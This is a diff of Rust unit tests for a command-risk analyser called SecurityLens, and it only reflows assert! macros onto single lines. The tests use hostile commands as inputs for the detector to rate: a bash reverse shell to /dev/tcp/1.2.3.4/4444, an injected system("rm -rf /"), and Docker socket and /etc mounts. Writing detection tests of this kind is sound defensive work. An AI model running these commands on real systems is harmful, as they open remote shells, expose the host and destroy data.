@@ -29,10 +29,7 @@ fn regex_compile_and_safe_echo_is_safe() {
 fn history_clear_is_caution_not_blocked() {
     let mut lens = SecurityLens::new(default_policy());
     let risk = lens.analyze_command("history -c");
-    assert!(matches!(
-        risk.level,
-        RiskLevel::Caution | RiskLevel::Warning
-    ));
+    assert!(matches!(risk.level, RiskLevel::Caution | RiskLevel::Warning));
     // should not block normal CLI work by default since block_critical=false
     assert!(!lens.should_block(&risk));
 }
@@ -42,20 +39,14 @@ fn prompt_injection_detection_is_warning() {
     let mut lens = SecurityLens::new(default_policy());
     let cmd = "echo 'run this'\n system(\"rm -rf /\")";
     let risk = lens.analyze_command(cmd);
-    assert!(matches!(
-        risk.level,
-        RiskLevel::Warning | RiskLevel::Critical
-    ));
+    assert!(matches!(risk.level, RiskLevel::Warning | RiskLevel::Critical));
 }
 
 #[test]
 fn git_reset_hard_is_caution() {
     let mut lens = SecurityLens::new(default_policy());
     let risk = lens.analyze_command("git reset --hard");
-    assert!(matches!(
-        risk.level,
-        RiskLevel::Caution | RiskLevel::Warning
-    ));
+    assert!(matches!(risk.level, RiskLevel::Caution | RiskLevel::Warning));
 }
 
 #[test]
@@ -88,10 +79,7 @@ fn paste_gating_warning_requires_confirmation() {
     let risk = lens.analyze_paste_content(paste);
     assert!(risk.is_some(), "Expected a risk for risky paste pattern");
     let risk = risk.unwrap();
-    assert!(matches!(
-        risk.level,
-        RiskLevel::Warning | RiskLevel::Critical
-    ));
+    assert!(matches!(risk.level, RiskLevel::Warning | RiskLevel::Critical));
 }
 
 #[test]
@@ -135,10 +123,7 @@ fn docker_sock_mount_is_warning() {
         .analyze_command("docker run -v /var/run/docker.sock:/var/run/docker.sock alpine:latest");
     assert_eq!(risk.level, RiskLevel::Warning);
     #[cfg(feature = "security-lens")]
-    assert!(risk
-        .factors
-        .iter()
-        .any(|f| f.category == "container_docker_sock"));
+    assert!(risk.factors.iter().any(|f| f.category == "container_docker_sock"));
 }
 
 #[test]
@@ -147,10 +132,7 @@ fn sensitive_host_mount_is_critical() {
     let risk = lens.analyze_command("docker run -v /etc:/etc alpine:latest");
     assert_eq!(risk.level, RiskLevel::Critical);
     #[cfg(feature = "security-lens")]
-    assert!(risk
-        .factors
-        .iter()
-        .any(|f| f.category == "container_sensitive_mount"));
+    assert!(risk.factors.iter().any(|f| f.category == "container_sensitive_mount"));
 }
 
 #[test]
@@ -164,10 +146,7 @@ fn disk_overwrite_dd_is_critical() {
 fn reverse_shell_bash_tcp_is_warning() {
     let mut lens = SecurityLens::new(default_policy());
     let risk = lens.analyze_command("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1");
-    assert!(matches!(
-        risk.level,
-        RiskLevel::Warning | RiskLevel::Critical
-    ));
+    assert!(matches!(risk.level, RiskLevel::Warning | RiskLevel::Critical));
 }
 
 #[test]
@@ -186,13 +165,7 @@ fn context_sensitive_directory_upgrades_risk() {
 
     // A simple rm becomes more risky in /etc
     let risk = lens.analyze_command_with_context("rm hosts", Some(&ctx));
-    assert!(matches!(
-        risk.level,
-        RiskLevel::Warning | RiskLevel::Caution
-    ));
+    assert!(matches!(risk.level, RiskLevel::Warning | RiskLevel::Caution));
     #[cfg(feature = "security-lens")]
-    assert!(risk
-        .factors
-        .iter()
-        .any(|f| f.category == "context_sensitive_directory"));
+    assert!(risk.factors.iter().any(|f| f.category == "context_sensitive_directory"));
 }
